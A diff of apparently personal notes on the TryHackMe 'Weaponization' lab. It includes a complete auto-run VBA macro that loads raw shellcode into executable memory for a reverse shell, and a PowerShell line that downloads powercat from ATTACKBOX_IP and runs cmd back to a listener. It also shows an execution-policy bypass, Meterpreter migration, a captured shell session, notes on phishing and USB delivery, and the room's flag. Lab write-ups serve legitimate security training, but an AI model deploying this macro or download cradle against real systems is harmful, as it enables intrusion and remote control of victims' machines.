@@ -325,3 +325,330 @@ Now replicate and apply what we discussed to get a reverse shell!
 
 Sub Auto_Open()
         Dim Osxkuqc As Long, Jstvnd As Variant, Fwdky As Long
+#If Vba7 Then
+        Dim  Vhnl As LongPtr, Wydbwiu As LongPtr
+#Else
+        Dim  Vhnl As Long, Wydbwiu As Long
+#EndIf
+        Jstvnd = Array(252,232,143,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20,15,183,74,38,139,114,40,49,255,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,87,139,66,60,1,208,139,64,120,133,192,116,76,1,208,139,72,24,80,139,88,32,1,211,133,201,116,60,73,139, _
+52,139,49,255,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,51,50,0,0,104,119,115,50,95,84, _
+104,76,119,38,7,137,232,255,208,184,144,1,0,0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,10,11,81,220,104,2,0,1,187,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0, _
+106,0,106,4,86,87,104,2,217,200,95,255,213,131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213, _
+94,94,255,12,36,15,133,112,255,255,255,233,155,255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)
+
+        Vhnl = VirtualAlloc(0, UBound(Jstvnd), &H1000, &H40)
+        For Fwdky = LBound(Jstvnd) To UBound(Jstvnd)
+                Osxkuqc = Jstvnd(Fwdky)
+                Wydbwiu = RtlMoveMemory(Vhnl + Fwdky, Osxkuqc, 1)
+        Next Fwdky
+        Wydbwiu = CreateThread(0, 0, Vhnl, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+        Auto_Open
+End Sub
+Sub Workbook_Open() 
+        Auto_Open
+End Sub
+```
+change Workbook_Open to (Document_Open ), with netcat works but for a little of time, with metasploit it's better.
+![[Pasted image 20220909235947.png]]
+### PowerShell - PSH
+PowerShell (PSH)
+PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, [Hacking with PowerShell](https://tryhackme.com/room/powershell) for more information about PowerShell.
+Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let's start by creating a straightforward PowerShell script that prints "Welcome to the Weaponization Room!" as follows,
+```text
+Write-Output "Welcome to the Weaponization Room!"
+```
+Save the file as thm.ps1. With the Write-Output, we print the message "Welcome to the Weaponization Room!" to the command prompt. Now let's run it and see the result.
+```CMD
+C:\Users\thm\Desktop>powershell -File thm.ps1
+File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
+information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
+    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+
+C:\Users\thm\Desktop>
+```
+Execution Policy
+PowerShell's execution policy is a security option to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted, which means it permits individual commands but not run any scripts.
+You can determine the current PowerShell setting of your Windows as follows,
+```CMD
+PS C:\Users\thm> Get-ExecutionPolicy
+Restricted
+```
+We can also easily change the PowerShell execution policy by running:
+```CMD
+PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+you to the security risks described in the about_Execution_Policies help topic at
+http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
+```
+Bypass Execution Policy
+Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts.
+In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows,
+```CMD
+C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
+Welcome to Weaponization Room!
+```
+Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.
+```Terminal
+user@machine$ git clone https://github.com/besimorhino/powercat.git
+Cloning into 'powercat'...
+remote: Enumerating objects: 239, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (4/4), done.
+remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
+Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
+Resolving deltas: 100% (72/72), done.
+```
+Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port 8080.
+```Terminal
+user@machine$ cd powercat
+user@machine$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+```
+On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim.
+```Terminal
+user@machine$ nc -lvp 1337
+```
+Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,
+```Terminal
+C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+```
+Now that we have executed the command above, the victim machine downloads the powercat.ps1  payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe and sends a connection back to the AttackBox that is listening on port 1337. After a couple of seconds, we should receive the connection call back:
+```Terminal
+user@machine$ nc -lvp 1337  listening on [any] 1337 ...
+10.10.12.53: inverse host lookup failed: Unknown host
+connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\thm>
+```
+Apply what you learned in this task. In the next task, we will discuss Command and Control frameworks!
+*No answer needed*
+![[Pasted image 20220910105545.png]]
+![[Pasted image 20220910105733.png]]
+```text
+──(kali㉿kali)-[~]
+└─$ git clone https://github.com/besimorhino/powercat.git
+Cloning into 'powercat'...
+remote: Enumerating objects: 239, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (4/4), done.
+remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
+Receiving objects: 100% (239/239), 61.75 KiB | 626.00 KiB/s, done.
+Resolving deltas: 100% (72/72), done.
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ls
+armitage-tmp  Downloads     multi_launcher  powercat     Templates
+book.txt      ftp_flag.txt  Music           Public       thm.hta
+Desktop       hashctf2      payload.hta     stager2.bat  Videos
+Documents     launcher.bat  Pictures        Sublist3r
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cd powercat
+```
+```text
+┌──(kali㉿kali)-[~/powercat]
+└─$ ls
+powercat.ps1  README.md
+```
+```text
+┌──(kali㉿kali)-[~/powercat]
+└─$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.129.90 - - [10/Sep/2022 11:58:49] "GET /powercat.ps1 HTTP/1.1" 200 -
+```
+![[Pasted image 20220910105938.png]]
+![[Pasted image 20220910110106.png]]
+### Command And Control - (C2 Or C&C)
+This task introduces the basic concept of Command and Control (C2) frameworks used in Red team operations.
+What is Command and Control (C2)?
+C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. C2 frameworks provide fast and straightforward approaches to:
+Generate various malicious payloads
+Enumerate the compromised machine/networks
+Perform privilege escalation and pivoting
+Lateral movement
+And many others
+Some popular C2 frameworks that we'll briefly highlight are Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system.
+Cobalt Strike
+Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations, including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements.
+PowerShell Empire
+PowerShell Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment. If you want to learn more about PowerShell Empire, we suggest trying out this room: Empire.
+Metasploit
+Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage. If you want to learn more about the Metasploit framework, we suggest trying out the following two rooms: Metasploit: Introduction and Metasploit.
+Most of the C2 frameworks use the techniques mentioned in this room as preparation for the initial access stage. For more details about the C2 framework, we invite you to check the Intro to C2 room.
+### Delivery Techniques
+Delivery Techniques
+Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.
+Email Delivery
+It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit [here](https://attack.mitre.org/techniques/T1566/001/). This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host.
+The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record.
+The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations.
+Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks.
+Web Delivery
+Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit [here](https://attack.mitre.org/techniques/T1189/).
+This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method.
+In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine.
+USB Delivery
+This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about the USB delivery, visit [here](https://attack.mitre.org/techniques/T1091/).
+Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment.
+Common USB attacks used to weaponize USB devices include [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky) and [USBHarpoon](https://www.minitool.com/news/usbharpoon.html), charging USB cable.
+Which method is used to distribute payloads to a victim at social events?
+*USB Delivery*
+### Practice Arena
+We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at http://10.10.129.90:8080/.
+Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN.
+The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link.
+Note for Doc files: the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back.
+In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate. In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow,
+![[Pasted image 20220910113426.png]]
+![[Pasted image 20220910113437.png]]
+```text
+Terminal
+```
+```text
+meterpreter > run post/windows/manage/migrate 
+
+[*] Running module against DESKTOP-1AU6NT4
+[*] Current server process: svchost.exe (3280)
+[*] Spawning notepad.exe process to migrate into
+[*] Spoofing PPID 0
+[*] Migrating into 4960
+[+] Successfully migrated into process 4960
+```
+In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell.
+For reference, you can use the MSFVenom Cheat Sheet on this [website](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/).
+What is the flag? Hint: Check the user desktop folder for the flag!
+(The easiest way to get reverse-shell is by applying the technique discussed in Task 4, which creates a malicious HTA link using Metasploit.)
+```text
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.11.81.220] from (UNKNOWN) [10.10.129.49] 49739
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\app>cd ..
+cd ..
+```
+```text
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9855-3AC5
+
+ Directory of C:\
+
+11/27/2021  01:36 PM    <DIR>          app
+07/16/2016  04:47 AM    <DIR>          PerfLogs
+10/25/2021  11:49 AM    <DIR>          Program Files
+10/29/2021  02:18 AM    <DIR>          Program Files (x86)
+10/21/2021  02:37 AM    <DIR>          Users
+10/25/2021  08:04 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)  36,113,199,104 bytes free
+```
+```text
+C:\>cd Users
+cd Users
+
+C:\Users>cd Desktop
+cd Desktop
+The system cannot find the path specified.
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9855-3AC5
+
+ Directory of C:\Users
+
+10/21/2021  02:37 AM    <DIR>          .
+10/21/2021  02:37 AM    <DIR>          ..
+12/09/2016  06:10 PM    <DIR>          defaultuser0
+12/09/2016  06:15 PM    <DIR>          Public
+09/10/2022  09:11 AM    <DIR>          thm
+               0 File(s)              0 bytes
+               5 Dir(s)  36,113,199,104 bytes free
+
+C:\Users>cd thm
+cd thm
+
+C:\Users\thm>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9855-3AC5
+
+ Directory of C:\Users\thm
+
+09/10/2022  09:11 AM    <DIR>          .
+09/10/2022  09:11 AM    <DIR>          ..
+10/21/2021  02:34 AM    <DIR>          Contacts
+11/27/2021  11:25 AM    <DIR>          Desktop
+10/21/2021  02:34 AM    <DIR>          Documents
+11/27/2021  11:32 AM    <DIR>          Downloads
+10/21/2021  02:34 AM    <DIR>          Favorites
+10/21/2021  02:34 AM    <DIR>          Links
+10/21/2021  02:34 AM    <DIR>          Music
+10/29/2021  02:18 AM    <DIR>          OneDrive
+10/21/2021  02:38 AM    <DIR>          Pictures
+10/21/2021  02:34 AM    <DIR>          Saved Games
+10/21/2021  02:35 AM    <DIR>          Searches
+10/21/2021  02:34 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  36,113,199,104 bytes free
+
+C:\Users\thm>cd Desktop
+cd Desktop
+
+C:\Users\thm\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9855-3AC5
+
+ Directory of C:\Users\thm\Desktop
+
+11/27/2021  11:25 AM    <DIR>          .
+11/27/2021  11:25 AM    <DIR>          ..
+11/27/2021  11:25 AM                37 flag.txt
+               1 File(s)             37 bytes
+               2 Dir(s)  36,113,199,104 bytes free
+
+C:\Users\thm\Desktop>more flag.txt
+more flag.txt
+THM{b4dbc2f16afdfe9579030a929b799719}
+```
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c2b48bf0b212e640b259a3405c2391b1.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/734a353799fc9f3cd05bb7421ceedd00.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f40a7711a408932981d827bfe6e522f3.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c7cbe29ee437b83a244994621cf6996.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f6d6a5f824fa64750e8b15ce6ba07a7a.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f3a719e8137e6fdca683eefbf373ea4f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/07c5180cd36650478806a1bf3d4595f2.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ceed0307819cf06500e6524a5f632d7.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/feb2f077507c6c242658e76ee88fb544.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5e12755e9b891865c6ef07e25047060b.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5e35b7436173da709dae5695c34d4f9.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e140bfbce59d6cf3e71489dba094adc2.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ca228c238732dcdf21139317992a0083.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5c80382621d3fcb578a9e128ca821e71.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9671adc6cb778fa7b151921f753e2f96.jpg)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5ca83fe7cfa5020a7bcb950ef90c8ec.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/1a0948c69efa832d68512b03357a7cbc.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/d374b6e862a19fb8be2a723f3e20884f.jpg)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/d92b185b39570d4740e6f6a8e905124a.png)
+- ***THM{b4dbc2f16afdfe9579030a929b799719}***
+
+## Notes / Lessons Learned
+[[Intro to C2]]
+
